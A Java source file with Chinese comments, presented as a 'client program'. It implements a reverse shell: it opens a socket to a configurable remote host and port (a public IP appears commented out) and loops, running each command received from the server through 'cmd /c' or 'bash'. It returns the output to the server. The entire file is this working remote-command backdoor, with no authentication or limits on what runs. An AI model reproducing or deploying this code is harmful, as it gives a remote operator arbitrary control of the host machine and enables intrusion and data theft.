package com.haozai.client;

import java.io.*;
import java.net.Socket;
import java.util.Locale;

/**
 * @author jackliu  Email:
 * @description: 客户端程序
 * @Version
 * @create 2023-07-17 9:58
 */
public class ClientC {
    private static String osCharset;
    //判断系统类型
    private static final String OS_NAME = System.getProperty("os.name").toLowerCase(Locale.ENGLISH);
    //判断是否是AIX(基于UNIX) false
    private static final boolean IS_AIX = "aix".equals(OS_NAME);
    //是Windows在前面加上cmd /c
    private static String cdPrefix = (IS_AIX?"bash ":"cmd /c ");


    public ClientC(){
        try {
            osCharset = getSystemCharset();
            if ("error".equals(osCharset)){
                //出现异常默认
                osCharset = "UTF-8";
            }
        } catch (IOException e) {
            e.printStackTrace();
            //出现异常默认
            osCharset = "UTF-8";
        }
    }

    public static void main(String[] args) {

        String host = "127.0.0.1";
        int port = 10086;
        if (args.length > 4){
            System.out.println("参数错误");
            System.out.println("java -jar  xxx.jar  -h host -p port");
            return;
        }else if (args.length == 4){
            for (int i = 0; i < 4; i++) {
                if ("-h".equals(args[i])){
                    host = args[i+1].trim();
                }else if ("-p".equals(args[i])){
                    port = Integer.parseInt(args[i+1].trim());
                }
            }
        }
        //吃初始化
        new ClientC();
        try {
//            Socket socket = new Socket("120.46.36.55", 4455);
            Socket socket = new Socket(host, port);
            //用于接收服务端的消息
            InputStream inputStream = socket.getInputStream();
            DataInputStream dataInputStream = new DataInputStream(inputStream);

            //用于向服务端发送消息
            OutputStream outputStream = socket.getOutputStream();
//            new OutputStreamWriter(outputStream,getSystemCharset());
            DataOutputStream dataOutputStream = new DataOutputStream(outputStream);

            while (true) {

                if (dataInputStream.available() > 0){
                    //如果有数据
                    String cmd = dataInputStream.readUTF();
                    try {
                        //执行系统命令
                        String res = execOsCmd(cmd);
                        dataOutputStream.writeUTF(res);
                        if ("exit".equals(cmd)){
                            break;
                        }
                    }catch (Exception e){
                        e.printStackTrace();
                        //将报错信息返回给服务端
                        String errorRes = new String(e.getMessage().getBytes(getSystemCharset()), "UTF-8");
                        System.out.println(errorRes);
                        dataOutputStream.writeUTF(errorRes);
                    }

                }

            }

        } catch (IOException e) {
            e.printStackTrace();
        }

    }


    //获取系统编码
    public static String getSystemCharset() throws IOException {

        Process exec = Runtime.getRuntime().exec(cdPrefix+"chcp");

        InputStream inputStream = exec.getInputStream();

        byte[] bytes = new byte[1024];

        //这里一次就能读完，不需要使用while
        int len = inputStream.read(bytes);
        if (len > 0){
            String res = new String(bytes, 0, len);
            char[] chars = res.toCharArray();
            String charsetType="";
            for (char c : chars){
                if (Character.isDigit(c)){
                    charsetType+=c;
                }
            }
//            System.out.println(charsetType);
            //判断属于哪种编码格式
            switch (charsetType){
                case "936":
                    return "GBK";
                case "65001":
                    return "UTF-8";
                default:
                    return "error";
            }
        }else {
            return "error";
        }
    }


    public static String execOsCmd(String cmd) throws IOException {

        Process exec = Runtime.getRuntime().exec(cdPrefix+cmd);
        //获取标exec的标准输出流
        InputStream inputStream = exec.getInputStream();
        //获取exec的错误流
        InputStream errorStream = exec.getErrorStream();

        //使用字符转换流解决乱码
        InputStreamReader isr = new InputStreamReader(inputStream,osCharset);
        InputStreamReader err = new InputStreamReader(errorStream,osCharset);

        String resInfo = getStringByStream(isr);
        String errInfo = getStringByStream(err);
        if ("".equals(resInfo)){
            //命令执行失败
            return errInfo;
        }
        //命令执行成功
        return resInfo;
    }

    //扶负责读取流中的字符串
    public static String getStringByStream(InputStreamReader is) throws IOException {
        char[] buff = new char[1024];
        int len;
        String resInfo="";
        while ((len = is.read(buff)) != -1){
            String res = new String(buff, 0, len);
            resInfo+=res;
        }
        return resInfo;
    }

}
